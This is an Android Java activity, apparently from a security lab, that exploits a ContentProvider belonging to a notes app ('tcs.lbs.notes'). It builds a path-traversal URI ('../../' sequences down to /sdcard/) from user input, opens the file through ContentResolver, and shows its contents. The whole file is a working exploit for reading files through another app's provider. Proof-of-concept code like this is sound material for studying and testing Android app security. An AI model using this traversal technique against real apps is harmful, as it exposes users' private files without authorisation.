package tcs.lbs.contentproviderexploit;


import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentProviderClient;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {
    EditText queryEditText;
    TextView resultTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        queryEditText = findViewById(R.id.query_editText);
        resultTextView = findViewById(R.id.resultTextView);
        queryEditText.setText("ExternalTextFile.txt");
    }

    public void queryContentProvider_onClicked(View view) throws IOException, RemoteException {
        //ContentResolver is a class  that acts as a central communication point between this app and content providers.
        ContentResolver contentResolver = getContentResolver();
        //make sure the evilURL begins with authorities.
        Uri evilURL = Uri.parse("content://tcs.lbs.notes/../../../../../../../../../sdcard/" + queryEditText.getText());
        // Read file contents
        try {
            //access the URL with ContentResolver
            InputStream fileStream = contentResolver.openInputStream(evilURL);
            Scanner scanner = new Scanner(fileStream).useDelimiter("\\A");
            String result = scanner.hasNext() ? scanner.next() : "";
            resultTextView.setText( result);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

